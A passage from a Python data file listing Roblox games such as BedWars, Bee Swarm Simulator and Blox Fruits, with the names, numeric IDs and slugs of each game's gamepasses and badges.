        FossilIsleReturnsBundle = 'Fossil Isle Returns Bundle', 951441773, 'Fossil_Isle_Returns_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Glider, StarterPack, DJ, CandyCannon, PremiumPlots, PremiumFaces, SupercarPack, HeartHoverboard, RoyalCarriages, MillionairePack, MermaidMansion, CelebrityMansion, PetHorse, PetGriffin, LemonadeStand, HotdogStand, ModernMansion, CozyHomeLure, SchoolandHospitalHomes, SoccerStadium, FossilIsleReturnsBundle]
    class Badges:
        TinyIsles                   = 'Tiny Isles',                            2124439922,       'Tiny_Isles'
        AncientRuins                = 'Ancient Ruins',                         2124439923,       'Ancient_Ruins'
        CoastalClimb                = 'Coastal Climb',                         2124439924,       'Coastal_Climb'
        LonelyPeak                  = 'Lonely Peak',                           2124439925,       'Lonely_Peak'
        Miniworld                   = 'Miniworld',                             2124439926,       'Miniworld'
        Pyramid                     = 'Pyramid',                               2124439927,       'Pyramid'
        ShipwreckBay                = 'Shipwreck Bay',                         2124439928,       'Shipwreck_Bay'
        RobloxEggHunt2020           = 'Roblox Egg Hunt 2020',                  2124520917,       'Roblox_Egg_Hunt_2020'
        RBBattlesChallenge          = 'RB Battles Challenge',                  2129488028,       'RB_Battles_Challenge'
        Unnamed                     = '???',                                   2129488030,       'Unnamed'
        Garden                      = 'Garden',                                135520552767917,  'Garden'
        RobloxTheGamesAdoptMeQuest1 = 'Roblox The Games: Adopt Me! - Quest 1', 1048893619880427, 'Roblox_The_Games_Adopt_Me_Quest_1'
        RobloxTheGamesAdoptMeQuest2 = 'Roblox The Games: Adopt Me! - Quest 2', 763171671267524,  'Roblox_The_Games_Adopt_Me_Quest_2'
        RobloxTheGamesAdoptMeQuest3 = 'Roblox The Games: Adopt Me! - Quest 3', 925260774262149,  'Roblox_The_Games_Adopt_Me_Quest_3'
        RobloxTheGamesAdoptMeShine1 = 'Roblox The Games: Adopt Me! - Shine 1', 89650026776535,   'Roblox_The_Games_Adopt_Me_Shine_1'
        RobloxTheGamesAdoptMeShine2 = 'Roblox The Games: Adopt Me! - Shine 2', 292596439745713,  'Roblox_The_Games_Adopt_Me_Shine_2'
        RobloxTheGamesAdoptMeShine3 = 'Roblox The Games: Adopt Me! - Shine 3', 1683279614525471, 'Roblox_The_Games_Adopt_Me_Shine_3'
        RobloxTheGamesAdoptMeShine4 = 'Roblox The Games: Adopt Me! - Shine 4', 1065569517641022, 'Roblox_The_Games_Adopt_Me_Shine_4'
        RobloxTheGamesAdoptMeShine5 = 'Roblox The Games: Adopt Me! - Shine 5', 3865916040798951, 'Roblox_The_Games_Adopt_Me_Shine_5'
        HunterBadge                 = 'Hunter Badge',                          160677344563654,  'Hunter_Badge'
        WhereBearBadge              = 'Where Bear? Badge',                     211728180632535,  'Where_Bear_Badge'
        SurvivorBadge               = 'Survivor Badge',                        639601989428398,  'Survivor_Badge'
        Testing                     = 'Testing',                               2388128713374485, 'Testing'
        HalloweenSpotlightRune      = 'Halloween Spotlight Rune',              2876404161740375, 'Halloween_Spotlight_Rune'
        HalloweenSpotlightKey       = 'Halloween Spotlight Key',               2865954472113762, 'Halloween_Spotlight_Key'
        # List Of Badges
        listOfBadges = [TinyIsles, AncientRuins, CoastalClimb, LonelyPeak, Miniworld, Pyramid, ShipwreckBay, RobloxEggHunt2020, RBBattlesChallenge, Unnamed, Garden, RobloxTheGamesAdoptMeQuest1, RobloxTheGamesAdoptMeQuest2, RobloxTheGamesAdoptMeQuest3, RobloxTheGamesAdoptMeShine1, RobloxTheGamesAdoptMeShine2, RobloxTheGamesAdoptMeShine3, RobloxTheGamesAdoptMeShine4, RobloxTheGamesAdoptMeShine5, HunterBadge, WhereBearBadge, SurvivorBadge, Testing, HalloweenSpotlightRune, HalloweenSpotlightKey]

class AnimeAdventures: # https://www.roblox.com/games/8304191830
    placeNames = 'Anime Adventures', 'Anime_Adventures', 'AA', 8304191830
    class Gamepasses:
        VIP             = 'VIP',               55372677, 'VIP'
        ShinyHunter     = 'Shiny Hunter',      55373046, 'Shiny_Hunter'
        UnitStorage     = 'Unit Storage',      55373124, 'Unit_Storage'
        Display3Units   = 'Display 3 Units',   55373224, 'Display_3_Units'
        DisplayAllUnits = 'Display All Units', 99127218, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, UnitStorage, Display3Units, DisplayAllUnits]
    class Badges:
        TheHatch2025 = 'The Hatch 2025', 4244887231710040, 'The_Hatch_2025'
        # List Of Badges
        listOfBadges = [TheHatch2025]

class AnimeDefenders: # https://www.roblox.com/games/17017769292
    placeNames = 'Anime Defenders', 'Anime_Defenders', 'AD', 17017769292
    class Gamepasses:
        VIP                    = 'VIP',                      812679198,  'VIP'
        ShinyHunter            = 'Shiny Hunter',             812891077,  'Shiny_Hunter'
        MoreBoothSpace         = 'More Booth Space',         812985318,  'More_Booth_Space'
        x3Speed                = '3x Speed',                 903541948,  '3x_Speed'
        x50Unboxing            = '50x Unboxing',             903895415,  '50x_Unboxing'
        DivineDragonBattlepass = 'Divine Dragon Battlepass', 857122763,  'Divine_Dragon_Battlepass'
        AthenyxsBattlepass     = 'Athenyx\'s Battlepass',    895533720,  'Athenyxs_Battlepass'
        ChristmasBattlepass    = 'Christmas Battlepass',     1004747738, 'Christmas_Battlepass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, MoreBoothSpace, x3Speed, x50Unboxing, DivineDragonBattlepass, AthenyxsBattlepass, ChristmasBattlepass]

class AnimeVanguards: # https://www.roblox.com/games/16146832113
    placeNames = 'Anime Vanguards', 'Anime_Vanguards', 'AV', 16146832113
    class Gamepasses:
        AnimeVanguardsTester = 'Anime Vanguards Tester', 780911708, 'Anime_Vanguards_Tester'
        ExtraUnitStorage     = 'Extra Unit Storage',     842367966, 'Extra_Unit_Storage'
        VIP                  = 'VIP',                    843295206, 'VIP'
        ShinyHunter          = 'Shiny Hunter',           846032291, 'Shiny_Hunter'
        DisplayAllUnits      = 'Display All Units',      846695813, 'Display_All_Units'
        # List Of Gamepasses
        listOfGamepasses = [AnimeVanguardsTester, ExtraUnitStorage, VIP, ShinyHunter, DisplayAllUnits]
    class Badges:
        MetTheOwner   = 'Met the Owner',   878251529804666,  'Met_the_Owner'
        MetADeveloper = 'Met a Developer', 4435567743462309, 'Met_a_Developer'
        # List Of Badges
        listOfBadges = [MetTheOwner, MetADeveloper]

class BedWars: # https://www.roblox.com/games/6872265039
    placeNames = 'BedWars', 'BedWars', 'BW', 6872265039
    class Gamepasses:
        VIPRank                = 'VIP Rank',                   18301866,   'VIP_Rank'
        BPSeason1              = 'BP Season 1',                21693382,   'BP_Season_1'
        BPSeason2              = 'BP Season 2',                24095899,   'BP_Season_2'
        BPSeason3              = 'BP Season 3',                26144939,   'BP_Season_3'
        BPSeason4              = 'BP Season 4',                35261547,   'BP_Season_4'
        BPSeason5              = 'BP Season 5',                50948602,   'BP_Season_5'
        BPSeason6              = 'BP Season 6',                87558788,   'BP_Season_6'
        BPSeason7              = 'BP Season 7',                137859107,  'BP_Season_7'
        BPSeason8              = 'BP Season 8',                194467229,  'BP_Season_8'
        BPSeason9              = 'BP Season 9',                655966705,  'BP_Season_9'
        BPSeason10             = 'BP Season 10',               773957870,  'BP_Season_10'
        BPSeason11             = 'BP Season 11',               894182315,  'BP_Season_11'
        BPSeason12             = 'BP Season 12',               1004797371, 'BP_Season_12'
        BPSeason13             = 'BP Season 13',               1164146553, 'BP_Season_13'
        HolidayBundle2021      = 'Holiday Bundle 2021',        26343736,   'Holiday_Bundle_2021'
        HolidayBundle2022      = 'Holiday Bundle 2022',        113770382,  'Holiday_Bundle_2022'
        HolidayBundle2023      = 'Holiday Bundle 2023',        675791713,  'Holiday_Bundle_2023'
        HolidayBundle2024      = 'Holiday Bundle 2024',        1009510880, 'Holiday_Bundle_2024'
        LunarNewYearBundle2022 = 'Lunar New Year Bundle 2022', 27969090,   'Lunar_New_Year_Bundle_2022'
        LunarBundle2024        = 'Lunar Bundle 2024',          701489596,  'Lunar_Bundle_2024'
        NewsYearsBundle2024    = 'News Years Bundle 2024',     678316034,  'News_Years_Bundle_2024'
        LumenEmberKitBundle    = 'Lumen & Ember Kit Bundle',   44594629,   'Lumen_And_Ember_Kit_Bundle'
        EmberLumenKitBundle    = 'Ember & Lumen Kit Bundle',   47400080,   'Ember_And_Lumen_Kit_Bundle'
        MinerBundle            = 'Miner Bundle',               29973548,   'Miner_Bundle'
        EvelynnBundle          = 'Evelynn Bundle',             67052293,   'Evelynn_Bundle'
        HannahBundle           = 'Hannah Bundle',              78679462,   'Hannah_Bundle'
        MarinaBundle           = 'Marina Bundle',              839951205,  'Marina_Bundle'
        TrixieBundle           = 'Trixie Bundle',              1083085937, 'Trixie_Bundle'
        CyberKit               = 'Cyber Kit',                  42490369,   'Cyber_Kit'
        MarinaKit              = 'Marina Kit',                 850765902,  'Marina_Kit'
        SilasKit               = 'Silas Kit',                  893892894,  'Silas_Kit'
        WrenKit                = 'Wren Kit',                   893911891,  'Wren_Kit'
        NazarKit               = 'Nazar Kit',                  893913917,  'Nazar_Kit'
        KaidaKit               = 'Kaida Kit',                  893937811,  'Kaida_Kit'
        DeathAdderKit          = 'Death Adder Kit',            893960773,  'Death_Adder_Kit'
        ArachneKit             = 'Arachne Kit',                952119163,  'Arachne_Kit'
        NyokaKit               = 'Nyoka Kit',                  1002745620, 'Nyoka_Kit'
        AgniKit                = 'Agni Kit',                   1003015617, 'Agni_Kit'
        VoidKnightKit          = 'Void Knight Kit',            1003723662, 'Void_Knight_Kit'
        GroveKit               = 'Grove Kit',                  1003729549, 'Grove_Kit'
        HephaestusKit          = 'Hephaestus Kit',             1003867591, 'Hephaestus_Kit'
        BekzatKit              = 'Bekzat Kit',                 1004227635, 'Bekzat_Kit'
        StyxKit                = 'Styx Kit',                   1004335582, 'Styx_Kit'
        UmaKit                 = 'Uma Kit',                    1004557543, 'Uma_Kit'
        SkollKit               = 'Skoll Kit',                  1027096064, 'Skoll_Kit'
        TrixieKit              = 'Trixie Kit',                 1105395958, 'Trixie_Kit'
        FarmerCletus           = 'Farmer Cletus',              18876495,   'Farmer_Cletus'
        Baker                  = 'Baker',                      19086951,   'Baker'
        Builder                = 'Builder',                    19088340,   'Builder'
        Archer                 = 'Archer',                     19275795,   'Archer'
        InfernalShielder       = 'Infernal Shielder',          19546564,   'Infernal_Shielder'
        Barbarian              = 'Barbarian',                  19551065,   'Barbarian'
        Melody                 = 'Melody',                     19722364,   'Melody'
        PirateDavey            = 'Pirate Davey',               20030035,   'Pirate_Davey'
        Eldertree              = 'Eldertree',                  20245233,   'Eldertree'
        Lassy                  = 'Lassy',                      20645574,   'Lassy'
        GrimReaper             = 'Grim Reaper',                20872871,   'Grim_Reaper'
        Wizard                 = 'Wizard',                     21261740,   'Wizard'
        Vulcan                 = 'Vulcan',                     21421966,   'Vulcan'
        AxolotlAmy             = 'Axolotl Amy',                24393543,   'Axolotl_Amy'
        Vanessa                = 'Vanessa',                    24913310,   'Vanessa'
        Freiya                 = 'Freiya',                     25647124,   'Freiya'
        Yuzi                   = 'Yuzi',                       28594502,   'Yuzi'
        ClanPass               = 'Clan Pass',                  32610830,   'Clan_Pass'
        Miner                  = 'Miner',                      33821514,   'Miner'
        Evelynn                = 'Evelynn',                    72590411,   'Evelynn'
        Hannah                 = 'Hannah',                     83730490,   'Hannah'
        Crypt                  = 'Crypt',                      97149830,   'Crypt'
        Zenith                 = 'Zenith',                     104797973,  'Zenith'
        Adetunde               = 'Adetunde',                   111620008,  'Adetunde'
        Lyla                   = 'Lyla',                       169772861,  'Lyla'
        Milo                   = 'Milo',                       255781462,  'Milo'
        Eldric                 = 'Eldric',                     641095710,  'Eldric'
        Lian                   = 'Lian',                       719110861,  'Lian'
        Triton                 = 'Triton',                     845519348,  'Triton'
        # List Of Gamepasses
        listOfGamepasses = [VIPRank, BPSeason1, BPSeason2, BPSeason3, BPSeason4, BPSeason5, BPSeason6, BPSeason7, BPSeason8, BPSeason9, BPSeason10, BPSeason11, BPSeason12, BPSeason13, HolidayBundle2021, HolidayBundle2022, HolidayBundle2023, HolidayBundle2024, LunarNewYearBundle2022, LunarBundle2024, NewsYearsBundle2024, LumenEmberKitBundle, EmberLumenKitBundle, MinerBundle, EvelynnBundle, HannahBundle, MarinaBundle, TrixieBundle, CyberKit, MarinaKit, SilasKit, WrenKit, NazarKit, KaidaKit, DeathAdderKit, ArachneKit, NyokaKit, AgniKit, VoidKnightKit, GroveKit, HephaestusKit, BekzatKit, StyxKit, UmaKit, SkollKit, TrixieKit, FarmerCletus, Baker, Builder, Archer, InfernalShielder, Barbarian, Melody, PirateDavey, Eldertree, Lassy, GrimReaper, Wizard, Vulcan, AxolotlAmy, Vanessa, Freiya, Yuzi, ClanPass, Miner, Evelynn, Hannah, Crypt, Zenith, Adetunde, Lyla, Milo, Eldric, Lian, Triton]
    class Badges:
        BeVictoriousonMinigameMountain = 'Be Victorious on Minigame Mountain', 2129916158,       'Be_Victorious_on_Minigame_Mountain'
        Champion                       = 'Champion',                           2146951156,       'Champion'
        NewYears2025                   = 'New Year\'s 2025',                   64120254673374,   'New_Years_2025'
        TheHuntBedWars                 = 'The Hunt - BedWars',                 661345209724224,  'The_Hunt_BedWars'
        EggHunt2025                    = 'Egg Hunt 2025',                      731758855100911,  'Egg_Hunt_2025'
        RobloxClassicEventToken1       = 'Roblox Classic Event - Token 1',     1229219986658067, 'Roblox_Classic_Event_Token_1'
        RobloxClassicEventTix1         = 'Roblox Classic Event - Tix 1',       2466928501842682, 'Roblox_Classic_Event_Tix_1'
        DefeatedArachnesLair           = 'Defeated Arachne\'s Lair',           2770029890136596, 'Defeated_Arachnes_Lair'
        DefeatedMarrowsMadness2025     = 'Defeated Marrow\'s Madness 2025',    3344558891408093, 'Defeated_Marrows_Madness_2025'
        # List Of Badges
        listOfBadges = [BeVictoriousonMinigameMountain, Champion, NewYears2025, TheHuntBedWars, EggHunt2025, RobloxClassicEventToken1, RobloxClassicEventTix1, DefeatedArachnesLair, DefeatedMarrowsMadness2025]

class BeeSwarmSimulator: # https://www.roblox.com/games/1537690962
    placeNames = 'Bee Swarm Simulator', 'Bee_Swarm_Simulator', 'BSS', 1537690962
    class Gamepasses:
        BearBee           = 'Bear Bee',             4257788, 'Bear_Bee'
        x2ConvertSpeed    = 'x2 Convert Speed',     4231119, 'x2_Convert_Speed'
        x2BeeGatherPollen = 'x2 Bee Gather Pollen', 4231126, 'x2_Bee_Gather_Pollen'
        x2TicketChance    = 'x2 Ticket Chance',     4492467, 'x2_Ticket_Chance'
        # List Of Gamepasses
        listOfGamepasses = [BearBee, x2ConvertSpeed, x2BeeGatherPollen, x2TicketChance]
    class Badges:
        YouPlayedBeeSwarmSimulator = 'You Played Bee Swarm Simulator!', 2124634293, 'You_Played_Bee_Swarm_Simulator'
        SwarmingEggOfTheHive       = 'Swarming Egg Of The Hive',        2124520746, 'Swarming_Egg_Of_The_Hive'
        BeesmasBeeliever           = 'Beesmas Beeliever',               2124445684, 'Beesmas_Beeliever'
        BeesmasOverachiever        = 'Beesmas Overachiever',            2124445842, 'Beesmas_Overachiever'
        EggHunt2019                = 'Egg Hunt 2019',                   2124458125, 'Egg_Hunt_2019'
        Million1Honey              = '1 Million Honey',                 1749468648, '1_Million_Honey'
        Million10Honey             = '10 Million Honey',                1749519033, '10_Million_Honey'
        Million100Honey            = '100 Million Honey',               1749523673, '100_Million_Honey'
        Billion1Honey              = '1 Billion Honey',                 1749534539, '1_Billion_Honey'
        Billion20Honey             = '20 Billion Honey',                2124426329, '20_Billion_Honey'
        Thousand500Goo             = '500 Thousand Goo',                1874484250, '500_Thousand_Goo'
        Million5Goo                = '5 Million Goo',                   1874485358, '5_Million_Goo'
        Million50Goo               = '50 Million Goo',                  1874486035, '50_Million_Goo'
        Million500Goo              = '500 Million Goo',                 1874487127, '500_Million_Goo'
        Billion10Goo               = '10 Billion Goo',                  2124426332, '10_Billion_Goo'
        Battle100Points            = '100 Battle Points',               1749564142, '100_Battle_Points'
        Thousand1BattlePoints      = '1 Thousand Battle Points',        1749566481, '1_Thousand_Battle_Points'
        Thousand10BattlePoints     = '10 Thousand Battle Points',       1749568562, '10_Thousand_Battle_Points'
        Thousand50BattlePoints     = '50 Thousand Battle Points',       1749570424, '50_Thousand_Battle_Points'
        Million1BattlePoints       = '1 Million Battle Points',         2124426330, '1_Million_Battle_Points'
        Ability2500Tokens          = '2500 Ability Tokens',             1874442964, '2500_Ability_Tokens'
        Thousand25AbilityTokens    = '25 Thousand Ability Tokens',      1874445609, '25_Thousand_AbilityTokens'
        Thousand100AbilityTokens   = '100 Thousand Ability Tokens',     1874446720, '100_Thousand_AbilityTokens'
        Million1AbilityTokens      = '1 Million Ability Tokens',        1874447816, '1_Million_Ability_Tokens'
        Million10AbilityTokens     = '10 Million Ability Tokens',       2124426331, '10_Million_Ability_Tokens'
        SunflowerCadet             = 'Sunflower Cadet',                 1749604083, 'Sunflower_Cadet'
        SunflowerHotshot           = 'Sunflower Hotshot',               1749606287, 'Sunflower_Hotshot'
        SunflowerAce               = 'Sunflower Ace',                   1749608577, 'Sunflower_Ace'
        SunflowerMaster            = 'Sunflower Master',                1749610498, 'Sunflower_Master'
        SunflowerGrandmaster       = 'Sunflower Grandmaster',           2124426333, 'Sunflower_Grandmaster'
        DandelionCadet             = 'Dandelion Cadet',                 1749628495, 'Dandelion_Cadet'
        DandelionHotshot           = 'Dandelion Hotshot',               1749630489, 'Dandelion_Hotshot'
        DandelionAce               = 'Dandelion Ace',                   1749631489, 'Dandelion_Ace'
        DandelionMaster            = 'Dandelion Master',                1749632737, 'Dandelion_Master'
        DandelionGrandmaster       = 'Dandelion Grandmaster',           2124426334, 'Dandelion_Grandmaster'
        MushroomCadet              = 'Mushroom Cadet',                  1749673718, 'Mushroom_Cadet'
        MushroomHotshot            = 'Mushroom Hotshot',                1749675237, 'Mushroom_Hotshot'
        MushroomAce                = 'Mushroom Ace',                    1749676247, 'Mushroom_Ace'
        MushroomMaster             = 'Mushroom Master',                 1749677419, 'Mushroom_Master'
        MushroomGrandmaster        = 'Mushroom Grandmaster',            2124426335, 'Mushroom_Grandmaster'
        BlueFlowerCadet            = 'Blue Flower Cadet',               1749679114, 'Blue_Flower_Cadet'
        BlueFlowerHotshot          = 'Blue Flower Hotshot',             1749680097, 'Blue_Flower_Hotshot'
        BlueFlowerAce              = 'Blue Flower Ace',                 1749680902, 'Blue_Flower_Ace'
        BlueFlowerMaster           = 'Blue Flower Master',              1749681692, 'Blue_Flower_Master'
        BlueFlowerGrandmaster      = 'Blue Flower Grandmaster',         2124426336, 'Blue_Flower_Grandmaster'
        CloverCadet                = 'Clover Cadet',                    1749684261, 'Clover_Cadet'
        CloverHotshot              = 'Clover Hotshot',                  1749685928, 'Clover_Hotshot'
        CloverAce                  = 'Clover Ace',                      1749686750, 'Clover_Ace'
        CloverMaster               = 'Clover Master',                   1749688211, 'Clover_Master'
        CloverGrandmaster          = 'Clover Grandmaster',              2124426337, 'Clover_Grandmaster'
        SpiderCadet                = 'Spider Cadet',                    1749770193, 'Spider_Cadet'
        SpiderHotshot              = 'Spider Hotshot',                  1749771674, 'Spider_Hotshot'
        SpiderAce                  = 'Spider Ace',                      1749772538, 'Spider_Ace'
        SpiderMaster               = 'Spider Master',                   1749773617, 'Spider_Master'
        SpiderGrandmaster          = 'Spider Grandmaster',              2124426338, 'Spider_Grandmaster'
        StrawberryCadet            = 'Strawberry Cadet',                1749775523, 'Strawberry_Cadet'
        StrawberryHotshot          = 'Strawberry Hotshot',              1749776451, 'Strawberry_Hotshot'
        StrawberryAce              = 'Strawberry Ace',                  1749777194, 'Strawberry_Ace'
        StrawberryMaster           = 'Strawberry Master',               1749779193, 'Strawberry_Master'
        StrawberryGrandmaster      = 'Strawberry Grandmaster',          2124426339, 'Strawberry_Grandmaster'
        BambooCadet                = 'Bamboo Cadet',                    1749780645, 'Bamboo_Cadet'
        BambooHotshot              = 'Bamboo Hotshot',                  1749781861, 'Bamboo_Hotshot'
        BambooAce                  = 'Bamboo Ace',                      1749782542, 'Bamboo_Ace'
        BambooMaster               = 'Bamboo Master',                   1749783500, 'Bamboo_Master'
        BambooGrandmaster          = 'Bamboo Grandmaster',              2124426340, 'Bamboo_Grandmaster'
        PineappleCadet             = 'Pineapple Cadet',                 1749784769, 'Pineapple_Cadet'
        PineappleHotshot           = 'Pineapple Hotshot',               1749786138, 'Pineapple_Hotshot'
        PineappleAce               = 'Pineapple Ace',                   1749787209, 'Pineapple_Ace'
        PineappleMaster            = 'Pineapple Master',                1749788323, 'Pineapple_Master'
        PineappleGrandmaster       = 'Pineapple Grandmaster',           2124426341, 'Pineapple_Grandmaster'
        PumpkinCadet               = 'Pumpkin Cadet',                   1749833884, 'Pumpkin_Cadet'
        PumpkinHotshot             = 'Pumpkin Hotshot',                 1749835166, 'Pumpkin_Hotshot'
        PumpkinAce                 = 'Pumpkin Ace',                     1749835972, 'Pumpkin_Ace'
        PumpkinMaster              = 'Pumpkin Master',                  1749836699, 'Pumpkin_Master'
        PumpkinGrandmaster         = 'Pumpkin Grandmaster',             2124426342, 'Pumpkin_Grandmaster'
        CactusCadet                = 'Cactus Cadet',                    1749838495, 'Cactus_Cadet'
        CactusHotshot              = 'Cactus Hotshot',                  1749839078, 'Cactus_Hotshot'
        CactusAce                  = 'Cactus Ace',                      1749840246, 'Cactus_Ace'
        CactusMaster               = 'Cactus Master',                   1749841052, 'Cactus_Master'
        CactusGrandmaster          = 'Cactus Grandmaster',              2124426343, 'Cactus_Grandmaster'
        RoseCadet                  = 'Rose Cadet',                      1749842402, 'Rose_Cadet'
        RoseHotshot                = 'Rose Hotshot',                    1749843985, 'Rose_Hotshot'
        RoseAce                    = 'Rose Ace',                        1749844635, 'Rose_Ace'
        RoseMaster                 = 'Rose Master',                     1749845555, 'Rose_Master'
        RoseGrandmaster            = 'Rose Grandmaster',                2124426344, 'Rose_Grandmaster'
        PineTreeCadet              = 'Pine Tree Cadet',                 1749846876, 'Pine_Tree_Cadet'
        PineTreeHotshot            = 'Pine Tree Hotshot',               1749847825, 'Pine_Tree_Hotshot'
        PineTreeAce                = 'Pine Tree Ace',                   1749848603, 'Pine_Tree_Ace'
        PineTreeMaster             = 'Pine Tree Master',                1749849756, 'Pine_Tree_Master'
        PineTreeGrandmaster        = 'Pine Tree Grandmaster',           2124426345, 'Pine_Tree_Grandmaster'
        QuestCadet                 = 'Quest Cadet',                     1873772794, 'Quest_Cadet'
        QuestHotshot               = 'Quest Hotshot',                   1873774367, 'Quest_Hotshot'
        QuestAce                   = 'Quest Ace',                       1873775257, 'Quest_Ace'
        QuestMaster                = 'Quest Master',                    1873779975, 'Quest_Master'
        StumpCadet                 = 'Stump Cadet',                     2124442929, 'Stump_Cadet'
        StumpHotshot               = 'Stump Hotshot',                   2124442930, 'Stump_Hotshot'
        StumpAce                   = 'Stump Ace',                       2124442931, 'Stump_Ace'
        StumpMaster                = 'Stump Master',                    2124442932, 'Stump_Master'
        StumpGrandmaster           = 'Stump Grandmaster',               2124442933, 'Stump_Grandmaster'
        PlaytimeCadet              = 'Playtime Cadet',                  2124443228, 'Playtime_Cadet'
        PlaytimeHotshot            = 'Playtime Hotshot',                2124443229, 'Playtime_Hotshot'
        PlaytimeAce                = 'Playtime Ace',                    2124443230, 'Playtime_Ace'
        PlaytimeMaster             = 'Playtime Master',                 2124443231, 'Playtime_Master'
        PlaytimeGrandmaster        = 'Playtime Grandmaster',            2124443232, 'Playtime_Grandmaster'
        # List Of Badges
        listOfBadges = [YouPlayedBeeSwarmSimulator, SwarmingEggOfTheHive, BeesmasBeeliever, BeesmasOverachiever, EggHunt2019, Million1Honey, Million10Honey, Million100Honey, Billion1Honey, Billion20Honey, Thousand500Goo, Million5Goo, Million50Goo, Million500Goo, Billion10Goo, Battle100Points, Thousand1BattlePoints, Thousand10BattlePoints, Thousand50BattlePoints, Million1BattlePoints, Ability2500Tokens, Thousand25AbilityTokens, Thousand100AbilityTokens, Million1AbilityTokens, Million10AbilityTokens, SunflowerCadet, SunflowerHotshot, SunflowerAce, SunflowerMaster, SunflowerGrandmaster, DandelionCadet, DandelionHotshot, DandelionAce, DandelionMaster, DandelionGrandmaster, MushroomCadet, MushroomHotshot, MushroomAce, MushroomMaster, MushroomGrandmaster, BlueFlowerCadet, BlueFlowerHotshot, BlueFlowerAce, BlueFlowerMaster, BlueFlowerGrandmaster, CloverCadet, CloverHotshot, CloverAce, CloverMaster, CloverGrandmaster, SpiderCadet, SpiderHotshot, SpiderAce, SpiderMaster, SpiderGrandmaster, StrawberryCadet, StrawberryHotshot, StrawberryAce, StrawberryMaster, StrawberryGrandmaster, BambooCadet, BambooHotshot, BambooAce, BambooMaster, BambooGrandmaster, PineappleCadet, PineappleHotshot, PineappleAce, PineappleMaster, PineappleGrandmaster, PumpkinCadet, PumpkinHotshot, PumpkinAce, PumpkinMaster, PumpkinGrandmaster, CactusCadet, CactusHotshot, CactusAce, CactusMaster, CactusGrandmaster, RoseCadet, RoseHotshot, RoseAce, RoseMaster, RoseGrandmaster, PineTreeCadet, PineTreeHotshot, PineTreeAce, PineTreeMaster, PineTreeGrandmaster, QuestCadet, QuestHotshot, QuestAce, QuestMaster, StumpCadet, StumpHotshot, StumpAce, StumpMaster, StumpGrandmaster, PlaytimeCadet, PlaytimeHotshot, PlaytimeAce, PlaytimeMaster, PlaytimeGrandmaster]

class BladeBall: # https://www.roblox.com/games/13772394625
    placeNames = 'Blade Ball', 'Blade_Ball', 'BB', 13772394625
    class Gamepasses:
        VIP         = 'VIP',          223367086,  'VIP'
        DoubleCoins = 'Double Coins', 226785981,  'Double_Coins'
        InstantSpin = 'Instant Spin', 229765926,  'Instant_Spin'
        TradingSign = 'Trading Sign', 895596060,  'Trading_Sign'
        RadiantVeil = 'Radiant Veil', 1203969437, 'Radiant_Veil'
        # List Of Gamepasses
        listOfGamepasses = [VIP, DoubleCoins, InstantSpin, TradingSign, RadiantVeil]
    class Badges:
        TheHatch = 'The Hatch', 3790278758533153, 'The_Hatch'
        # List Of Badges
        listOfBadges = [TheHatch]

class BloxFruits: # https://www.roblox.com/games/2753915549
    placeNames = 'Blox Fruits', 'Blox_Fruits', 'BF', 2753915549
    class Gamepasses:
        x2Money       = '2x Money',       6028662, '2x_Money'
        x2Mastery     = '2x Mastery',     6240746, '2x_Mastery'
        x2BossDrops   = '2x Boss Drops',  7578721, '2x_Boss_Drops'
        DarkBlade     = 'Dark Blade',     6028786, 'Dark_Blade'
        FastBoats     = 'Fast Boats',     6525589, 'Fast_Boats'
        FruitNotifier = 'Fruit Notifier', 6738811, 'Fruit_Notifier'
        # List Of Gamepasses
        listOfGamepasses = [x2Money, x2Mastery, x2BossDrops, DarkBlade, FastBoats, FruitNotifier]
    class Badges:
        SecondSea     = 'Second Sea', 2125253106, 'Second_Sea'
        ThirdSea      = 'Third Sea',  2125253113, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class BlueLockRivals: # https://www.roblox.com/games/18668065416
    placeNames = 'Blue Lock: Rivals', 'Blue_Lock_Rivals', 'BLR', 18668065416
    class Gamepasses:
        VIP                = 'VIP',                 952453152,  'VIP'
        AnimeEmotes        = 'Anime Emotes',        957906237,  'Anime_Emotes'
        ToxicEmotes        = 'Toxic Emotes',        958185291,  'Toxic_Emotes'
        SkipSpins          = 'Skip Spins',          965195377,  'Skip_Spins'
        AwakeningOutfits   = 'Awakening Outfits',   1034038790, 'Awakening_Outfits'
        GoalSound          = 'Goal Sound',          1045871823, 'Goal_Sound'
        AnkleBreakerSound  = 'Ankle Breaker Sound', 1046171023, 'Ankle_Breaker_Sound'
        PrivateServersPlus = 'Private Servers+',    1054209537, 'Private_Servers_Plus'
        Slot2              = 'Slot 2',              924321836,  'Slot_2'
        Slot3              = 'Slot 3',              924345504,  'Slot_3'
        # List Of Gamepasses
        listOfGamepasses = [VIP, AnimeEmotes, ToxicEmotes, SkipSpins, AwakeningOutfits, GoalSound, AnkleBreakerSound, PrivateServersPlus, Slot2, Slot3]

class BubbleGumSimulatorINFINITY: # https://www.roblox.com/games/85896571713843
    placeNames = 'Bubble Gum Simulator INFINITY', 'Bubble_Gum_Simulator_INFINITY', 'BGSI', 85896571713843
    class Gamepasses:
        VIP             = 'VIP',               1110079647, 'VIP'
        InfinityGum     = 'Infinity Gum',      1109858215, 'Infinity_Gum'
        ExtraEquips     = 'Extra Equips',      1111553262, 'Extra_Equips'
        FastHatch       = 'Fast Hatch',        1111985110, 'Fast_Hatch'
        TripleHatch     = 'Triple Hatch',      1112014853, 'Triple_Hatch'
        DigitalStorage  = 'Digital Storage',   1109959879, 'Digital_Storage'
        DoubleLuck      = 'Double Luck',       1109987673, 'Double_Luck'
        DoubleCurrency  = 'Double Currency',   1169607896, 'Double_Currency'
        DoubleGems      = 'Double Gems',       1111001300, 'Double_Gems'
        DoubleFishingXP = 'Double Fishing XP', 1384697982, 'Double_Fishing_XP'
        AutoFishing     = 'Auto Fishing',      1384649993, 'Auto_Fishing'
        LuckyEnchants   = 'Lucky Enchants',    1404811119, 'Lucky_Enchants'
        # List Of Gamepasses
        listOfGamepasses = [VIP, InfinityGum, ExtraEquips, FastHatch, TripleHatch, DigitalStorage, DoubleLuck, DoubleCurrency, DoubleGems, DoubleFishingXP, AutoFishing, LuckyEnchants]
    class Badges:
        Welcome            = 'Welcome',                967619436348747,  'Welcome'
        Bubbler500         = 'Bubbler (500)',          542484307529882,  'Bubbler_500'
        Starter2500        = 'Starter (2500)',         1305120438687619, 'Starter_2500'
